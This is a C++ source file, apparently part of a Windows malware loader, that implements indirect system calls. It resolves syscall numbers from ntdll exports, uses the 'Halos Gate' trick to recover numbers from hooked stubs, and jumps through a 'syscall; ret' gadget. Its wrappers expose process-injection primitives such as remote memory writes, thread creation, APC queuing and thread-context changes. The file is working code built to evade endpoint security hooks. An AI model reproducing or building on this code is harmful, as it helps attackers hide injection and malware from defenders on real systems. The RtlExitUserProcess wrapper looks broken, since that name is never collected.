#include "Syscalls.h"
#include "NtHashes.h"
#include "ApiHash.h"
#include "Unhook.h"

#include <windows.h>

#include <algorithm>
#include <cstring>
#include <string>
#include <unordered_map>
#include <vector>

namespace syscalls {

// ---- asm globals -----------------------------------------------------------
extern "C" std::uint32_t  g_ssn;
extern "C" std::uintptr_t g_gadget;

extern "C" NTSTATUS IndirectSyscall(std::uintptr_t a0,  std::uintptr_t a1,
                                    std::uintptr_t a2,  std::uintptr_t a3,
                                    std::uintptr_t a4,  std::uintptr_t a5,
                                    std::uintptr_t a6,  std::uintptr_t a7,
                                    std::uintptr_t a8,  std::uintptr_t a9,
                                    std::uintptr_t a10, std::uintptr_t a11);

namespace {

struct ExportEntry {
    std::uint32_t rva;
    std::string name;
    int index;          // position in RVA-sorted order
    int ssn;            // -1 = unresolved/hooked
};

std::unordered_map<std::uint32_t, std::uint32_t> g_ssns;
void* g_gadget_ptr = nullptr;

// Nt* prologue: 4C 8B D1 B8 ?? ?? ?? ?? — SSN at offset 4.
bool parse_clean_ssn(const std::uint8_t* stub, std::uint32_t& ssn) {
    if (!stub) return false;
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8) {
        ssn = static_cast<std::uint32_t>(stub[4]) |
              (static_cast<std::uint32_t>(stub[5]) << 8) |
              (static_cast<std::uint32_t>(stub[6]) << 16) |
              (static_cast<std::uint32_t>(stub[7]) << 24);
        return true;
    }
    // some stubs begin with mov eax, imm32 (no mov r10,rcx)
    if (stub[0] == 0xB8) {
        ssn = static_cast<std::uint32_t>(stub[1]) |
              (static_cast<std::uint32_t>(stub[2]) << 8) |
              (static_cast<std::uint32_t>(stub[3]) << 16) |
              (static_cast<std::uint32_t>(stub[4]) << 24);
        return true;
    }
    return false;
}

// Walk ntdll exports, collect Nt* (skip Zw*) into a list sorted by RVA.
std::vector<ExportEntry> collect_nt_exports() {
    std::vector<ExportEntry> entries;
    auto base = reinterpret_cast<std::uint8_t*>(unhook::loaded_ntdll_base());
    if (!base) return entries;

    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress) return entries;
    auto exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(base + dir.VirtualAddress);
    auto names = reinterpret_cast<std::uint32_t*>(base + exp->AddressOfNames);
    auto ords = reinterpret_cast<std::uint16_t*>(base + exp->AddressOfNameOrdinals);
    auto funcs = reinterpret_cast<std::uint32_t*>(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* nm = reinterpret_cast<const char*>(base + names[i]);
        // Take Nt* only (Zw* share SSNs; Nt* are the canonical user entry).
        if (nm[0] != 'N' || nm[1] != 't') continue;
        ExportEntry e;
        e.rva = funcs[ords[i]];
        e.name = nm;
        e.ssn = -1;
        entries.push_back(e);
    }
    std::sort(entries.begin(), entries.end(),
              [](const ExportEntry& a, const ExportEntry& b) { return a.rva < b.rva; });
    for (int i = 0; i < static_cast<int>(entries.size()); ++i) entries[i].index = i;
    return entries;
}

bool resolve_ssns() {
    auto entries = collect_nt_exports();
    if (entries.empty()) return false;
    auto base = reinterpret_cast<std::uint8_t*>(unhook::loaded_ntdll_base());

    // First pass: clean stubs.
    for (auto& e : entries) {
        std::uint32_t s = 0;
        if (parse_clean_ssn(base + e.rva, s)) e.ssn = static_cast<int>(s);
    }
    // Halos Gate: hooked stubs derive SSN from nearest clean neighbor by index.
    for (int i = 0; i < static_cast<int>(entries.size()); ++i) {
        if (entries[i].ssn != -1) continue;
        // search outward
        int cleanIdx = -1;
        for (int d = 1; d < static_cast<int>(entries.size()); ++d) {
            if (i - d >= 0 && entries[i - d].ssn != -1) { cleanIdx = i - d; break; }
            if (i + d < static_cast<int>(entries.size()) && entries[i + d].ssn != -1) {
                cleanIdx = i + d; break;
            }
        }
        if (cleanIdx == -1) continue;
        int delta = i - cleanIdx; // positive if hooked is after clean
        entries[i].ssn = entries[cleanIdx].ssn + delta;
    }

    for (const auto& e : entries) {
        if (e.ssn >= 0) g_ssns[api::hash(e.name.c_str())] = static_cast<std::uint32_t>(e.ssn);
    }
    return !g_ssns.empty();
}

// Locate `syscall; ret` in *loaded* ntdll .text (must be RX). The private
// clean_text() copy is RW-only and must not be used as a jump target.
bool find_gadget() {
    auto base = reinterpret_cast<std::uint8_t*>(unhook::loaded_ntdll_base());
    if (!base) return false;
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    auto sect = IMAGE_FIRST_SECTION(nt);
    const std::uint8_t* text = nullptr;
    std::size_t size = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (std::memcmp(sect[i].Name, ".text", 5) == 0) {
            text = base + sect[i].VirtualAddress;
            size = sect[i].Misc.VirtualSize;
            break;
        }
    }
    if (!text || size < 3) return false;
    for (std::size_t i = 0; i + 3 <= size; ++i) {
        if (text[i] == 0x0F && text[i + 1] == 0x05 && text[i + 2] == 0xC3) {
            g_gadget_ptr = const_cast<std::uint8_t*>(text + i);
            return true;
        }
    }
    return false;
}

} // namespace

bool init() {
    if (!unhook::loaded_ntdll_base()) return false;
    if (!resolve_ssns()) return false;
    return find_gadget();
}

std::uint32_t ssn_for(std::uint32_t name_hash) {
    auto it = g_ssns.find(name_hash);
    return it == g_ssns.end() ? 0 : it->second;
}

void* gadget() { return g_gadget_ptr; }

NTSTATUS invoke(std::uint32_t ssn,
                std::uintptr_t a0,  std::uintptr_t a1,
                std::uintptr_t a2,  std::uintptr_t a3,
                std::uintptr_t a4,  std::uintptr_t a5,
                std::uintptr_t a6,  std::uintptr_t a7,
                std::uintptr_t a8,  std::uintptr_t a9,
                std::uintptr_t a10, std::uintptr_t a11) {
    if (!g_gadget_ptr) return static_cast<NTSTATUS>(0xC0000001L); // STATUS_UNSUCCESSFUL
    g_ssn = ssn;
    g_gadget = reinterpret_cast<std::uintptr_t>(g_gadget_ptr);
    return IndirectSyscall(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

// ---- typed wrappers --------------------------------------------------------
NTSTATUS ScAllocVm(void* ProcessHandle, void** BaseAddress,
    std::uint32_t ZeroBits, std::size_t* RegionSize, std::uint32_t AllocationType,
    std::uint32_t Protect) {
    return invoke(ssn_for(nthash::NtAllocateVirtualMemory),
        (std::uintptr_t)ProcessHandle, (std::uintptr_t)BaseAddress,
        (std::uintptr_t)ZeroBits, (std::uintptr_t)RegionSize,
        (std::uintptr_t)AllocationType, (std::uintptr_t)Protect,
        0,0,0,0,0,0);
}
NTSTATUS ScProtectVm(void* ProcessHandle, void** BaseAddress,
    std::size_t* RegionSize, std::uint32_t NewProtect, std::uint32_t* OldProtect) {
    return invoke(ssn_for(nthash::NtProtectVirtualMemory),
        (std::uintptr_t)ProcessHandle, (std::uintptr_t)BaseAddress,
        (std::uintptr_t)RegionSize, (std::uintptr_t)NewProtect,
        (std::uintptr_t)OldProtect, 0,0,0,0,0,0,0);
}
NTSTATUS ScFreeVm(void* ProcessHandle, void** BaseAddress,
    std::size_t* RegionSize, std::uint32_t FreeType) {
    return invoke(ssn_for(nthash::NtFreeVirtualMemory),
        (std::uintptr_t)ProcessHandle, (std::uintptr_t)BaseAddress,
        (std::uintptr_t)RegionSize, (std::uintptr_t)FreeType,
        0,0,0,0,0,0,0,0);
}
NTSTATUS ScWriteVm(void* ProcessHandle, void* BaseAddress,
    const void* Buffer, std::size_t NumberOfBytesToWrite, std::size_t* NumberOfBytesWritten) {
    return invoke(ssn_for(nthash::NtWriteVirtualMemory),
        (std::uintptr_t)ProcessHandle, (std::uintptr_t)BaseAddress,
        (std::uintptr_t)Buffer, (std::uintptr_t)NumberOfBytesToWrite,
        (std::uintptr_t)NumberOfBytesWritten, 0,0,0,0,0,0,0);
}
NTSTATUS ScCreateFile(void** FileHandle, std::uint32_t DesiredAccess,
    void* ObjectAttributes, void* IoStatusBlock, void* AllocationSize,
    std::uint32_t FileAttributes, std::uint32_t ShareAccess,
    std::uint32_t CreateDisposition, std::uint32_t CreateOptions, void* EaBuffer,
    std::uint32_t EaLength) {
    return invoke(ssn_for(nthash::NtCreateFile),
        (std::uintptr_t)FileHandle, (std::uintptr_t)DesiredAccess,
        (std::uintptr_t)ObjectAttributes, (std::uintptr_t)IoStatusBlock,
        (std::uintptr_t)AllocationSize, (std::uintptr_t)FileAttributes,
        (std::uintptr_t)ShareAccess, (std::uintptr_t)CreateDisposition,
        (std::uintptr_t)CreateOptions, (std::uintptr_t)EaBuffer,
        (std::uintptr_t)EaLength, 0);
}
NTSTATUS ScReadFile(void* FileHandle, void* Event, void* ApcRoutine,
    void* ApcContext, void* IoStatusBlock, void* Buffer, std::uint32_t Length,
    void* ByteOffset, void* Key) {
    return invoke(ssn_for(nthash::NtReadFile),
        (std::uintptr_t)FileHandle, (std::uintptr_t)Event,
        (std::uintptr_t)ApcRoutine, (std::uintptr_t)ApcContext,
        (std::uintptr_t)IoStatusBlock, (std::uintptr_t)Buffer,
        (std::uintptr_t)Length, (std::uintptr_t)ByteOffset,
        (std::uintptr_t)Key, 0,0,0);
}
NTSTATUS ScWriteFile(void* FileHandle, void* Event, void* ApcRoutine,
    void* ApcContext, void* IoStatusBlock, void* Buffer, std::uint32_t Length,
    void* ByteOffset, void* Key) {
    return invoke(ssn_for(nthash::NtWriteFile),
        (std::uintptr_t)FileHandle, (std::uintptr_t)Event,
        (std::uintptr_t)ApcRoutine, (std::uintptr_t)ApcContext,
        (std::uintptr_t)IoStatusBlock, (std::uintptr_t)Buffer,
        (std::uintptr_t)Length, (std::uintptr_t)ByteOffset,
        (std::uintptr_t)Key, 0,0,0);
}
NTSTATUS ScClose(void* Handle) {
    return invoke(ssn_for(nthash::NtClose), (std::uintptr_t)Handle, 0,0,0,0,0,0,0,0,0,0,0);
}
NTSTATUS ScQuerySysInfo(int Class, void* Buffer,
    std::uint32_t Length, std::uint32_t* ResultLength) {
    return invoke(ssn_for(nthash::NtQuerySystemInformation),
        (std::uintptr_t)Class, (std::uintptr_t)Buffer,
        (std::uintptr_t)Length, (std::uintptr_t)ResultLength,
        0,0,0,0,0,0,0,0);
}
NTSTATUS ScQueryProcInfo(void* ProcessHandle, int Class, void* Buffer,
    std::uint32_t Length, std::uint32_t* ResultLength) {
    return invoke(ssn_for(nthash::NtQueryInformationProcess),
        (std::uintptr_t)ProcessHandle, (std::uintptr_t)Class,
        (std::uintptr_t)Buffer, (std::uintptr_t)Length,
        (std::uintptr_t)ResultLength, 0,0,0,0,0,0,0);
}
NTSTATUS ScSetThreadInfo(void* ThreadHandle, int Class,
    void* Info, std::uint32_t Length) {
    return invoke(ssn_for(nthash::NtSetInformationThread),
        (std::uintptr_t)ThreadHandle, (std::uintptr_t)Class,
        (std::uintptr_t)Info, (std::uintptr_t)Length,
        0,0,0,0,0,0,0,0);
}
NTSTATUS ScGetCtx(void* ThreadHandle, CONTEXT* Context) {
    return invoke(ssn_for(nthash::NtGetContextThread),
        (std::uintptr_t)ThreadHandle, (std::uintptr_t)Context,
        0,0,0,0,0,0,0,0,0,0);
}
NTSTATUS ScSetCtx(void* ThreadHandle, CONTEXT* Context) {
    return invoke(ssn_for(nthash::NtSetContextThread),
        (std::uintptr_t)ThreadHandle, (std::uintptr_t)Context,
        0,0,0,0,0,0,0,0,0,0);
}
NTSTATUS ScQueueApc(void* ThreadHandle, void* ApcRoutine,
    void* Argument1, void* Argument2, void* Argument3) {
    return invoke(ssn_for(nthash::NtQueueApcThread),
        (std::uintptr_t)ThreadHandle, (std::uintptr_t)ApcRoutine,
        (std::uintptr_t)Argument1, (std::uintptr_t)Argument2,
        (std::uintptr_t)Argument3, 0,0,0,0,0,0,0);
}
NTSTATUS ScResume(void* ThreadHandle, std::uint32_t* SuspendCount) {
    return invoke(ssn_for(nthash::NtResumeThread),
        (std::uintptr_t)ThreadHandle, (std::uintptr_t)SuspendCount,
        0,0,0,0,0,0,0,0,0,0);
}
NTSTATUS ScCreateSection(void** SectionHandle, std::uint32_t DesiredAccess, void* ObjectAttributes,
    void* MaximumSize, std::uint32_t PageAttributes, std::uint32_t SectionAttributes, void* FileHandle) {
    return invoke(ssn_for(nthash::NtCreateSection),
        (std::uintptr_t)SectionHandle, (std::uintptr_t)DesiredAccess,
        (std::uintptr_t)ObjectAttributes, (std::uintptr_t)MaximumSize,
        (std::uintptr_t)PageAttributes, (std::uintptr_t)SectionAttributes,
        (std::uintptr_t)FileHandle, 0,0,0,0,0);
}
NTSTATUS ScCreateProcessEx(void** ProcessHandle, std::uint32_t DesiredAccess, void* ObjectAttributes,
    void* ParentProcess, std::uint32_t Flags, void* SectionHandle, void* DebugPort, void* ExceptionPort,
    std::uint32_t JobMemberLevel) {
    return invoke(ssn_for(nthash::NtCreateProcessEx),
        (std::uintptr_t)ProcessHandle, (std::uintptr_t)DesiredAccess,
        (std::uintptr_t)ObjectAttributes, (std::uintptr_t)ParentProcess,
        (std::uintptr_t)Flags, (std::uintptr_t)SectionHandle,
        (std::uintptr_t)DebugPort, (std::uintptr_t)ExceptionPort,
        (std::uintptr_t)JobMemberLevel, 0,0,0);
}
NTSTATUS ScCreateThreadEx(void** ThreadHandle, std::uint32_t DesiredAccess, void* ObjectAttributes,
    void* ProcessHandle, void* StartRoutine, void* Argument, BOOLEAN CreateSuspended,
    std::size_t StackZeroBits, std::size_t SizeOfStackCommit, std::size_t SizeOfStackReserve,
    void* BytesBuffer) {
    return invoke(ssn_for(nthash::NtCreateThreadEx),
        (std::uintptr_t)ThreadHandle, (std::uintptr_t)DesiredAccess,
        (std::uintptr_t)ObjectAttributes, (std::uintptr_t)ProcessHandle,
        (std::uintptr_t)StartRoutine, (std::uintptr_t)Argument,
        (std::uintptr_t)CreateSuspended, (std::uintptr_t)StackZeroBits,
        (std::uintptr_t)SizeOfStackCommit, (std::uintptr_t)SizeOfStackReserve,
        (std::uintptr_t)BytesBuffer, 0);
}
NTSTATUS ScContinue(CONTEXT* Context, BOOLEAN RaiseAlert) {
    return invoke(ssn_for(nthash::NtContinue),
        (std::uintptr_t)Context, (std::uintptr_t)RaiseAlert,
        0,0,0,0,0,0,0,0,0,0);
}
NTSTATUS ScAlert(void* ThreadHandle) {
    return invoke(ssn_for(nthash::NtAlertThread),
        (std::uintptr_t)ThreadHandle, 0,0,0,0,0,0,0,0,0,0,0);
}
NTSTATUS ScTestAlert() {
    return invoke(ssn_for(nthash::NtTestAlert), 0,0,0,0,0,0,0,0,0,0,0,0);
}
NTSTATUS ScExitProcess(NTSTATUS Status) {
    return invoke(ssn_for(nthash::RtlExitUserProcess),
        (std::uintptr_t)Status, 0,0,0,0,0,0,0,0,0,0,0);
}

} // namespace syscalls
